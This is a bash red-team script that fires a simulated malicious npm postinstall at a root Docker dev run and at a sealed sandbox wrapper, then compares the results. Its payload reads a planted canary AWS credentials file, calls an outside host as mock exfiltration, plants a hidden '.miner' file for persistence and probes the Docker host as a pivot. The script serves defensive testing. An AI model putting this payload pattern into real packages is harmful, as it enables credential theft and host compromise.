#!/usr/bin/env bash
# redteam_supplychain_sim.sh — fire a simulated malicious npm postinstall at
# two setups and score what it achieves: the typical dev invocation
# (`docker run -v $HOME ... ` as root, full network) vs the sealed wrapper.
# The payload targets a PLANTED CANARY secret, never your real credentials.
set -uo pipefail
HERE="$(cd "$(dirname "$0")" && pwd)"
IMAGE="node:22-alpine"

FAKEHOME="$(mktemp -d)"; WS="$(mktemp -d)"
mkdir -p "$FAKEHOME/.aws"
echo -e "[default]\naws_access_key_id=CANARY_AKIA_d34db33f\naws_secret_access_key=CANARY_s3cr3t" > "$FAKEHOME/.aws/credentials"
echo "{\"name\":\"victim-app\"}" > "$WS/package.json"

# The malicious postinstall body (safe: reads canary, exfils to a real off-list
# 200 sink, tries host persist + LAN pivot + reports uid). No real harm.
PAYLOAD='S=$(cat /secrets/.aws/credentials 2>/dev/null | grep -o "CANARY_[A-Za-z0-9_]*" | head -1);
[ -n "$S" ] && echo "SECRET_THEFT: $S" || echo "SECRET_THEFT: none";
wget -T6 -qO /dev/null "https://example.com/" 2>/dev/null && echo "EXFIL: sent-offlist(example.com 200)" || echo "EXFIL: blocked";
( touch /usr/local/bin/.miner 2>/dev/null && echo "PERSIST: wrote-host-bin" ) || echo "PERSIST: blocked";
PV=$(wget -T4 -qO /dev/null http://host.docker.internal/ 2>&1); case "$PV" in *403*|*Filtered*|*unreachable*|*"bad address"*) echo "LAN_PIVOT: blocked";; *refused*|"") echo "LAN_PIVOT: host-REACHABLE";; *) echo "LAN_PIVOT: host-REACHABLE";; esac;
[ "$(id -u)" = "0" ] && echo "PRIV: root" || echo "PRIV: uid-$(id -u)"'

echo "════════ SUPPLY-CHAIN SIM · malicious postinstall ════════"
echo
echo "▶ SETUP A — typical dev run:  docker run --rm -v \$HOME -v \$PWD  (root, full net)"
docker run --rm -v "$FAKEHOME":/secrets:ro -v "$WS":/app -w /app "$IMAGE" \
  sh -c "$PAYLOAD" 2>&1 | sed 's/^/    /'
echo
echo "▶ SETUP B — sealed_dev_sandbox.sh  (non-root, no host mount, allowlist egress)"
# Sealed run mounts ONLY the project; /secrets is never exposed.
bash "$HERE/sealed_dev_sandbox.sh" --workspace "$WS" --image "$IMAGE" --egress sealed -- \
  sh -c "$PAYLOAD" 2>&1 | grep -Ev '^(Sending build|#|\[)' | sed 's/^/    /'
bash "$HERE/sealed_dev_sandbox.sh" --teardown >/dev/null 2>&1 || true

echo
echo "host artifacts after run:"
echo "    /usr/local/bin/.miner on host?  $([ -e /usr/local/bin/.miner ] && echo YES || echo no)"
rm -rf "$FAKEHOME" "$WS"
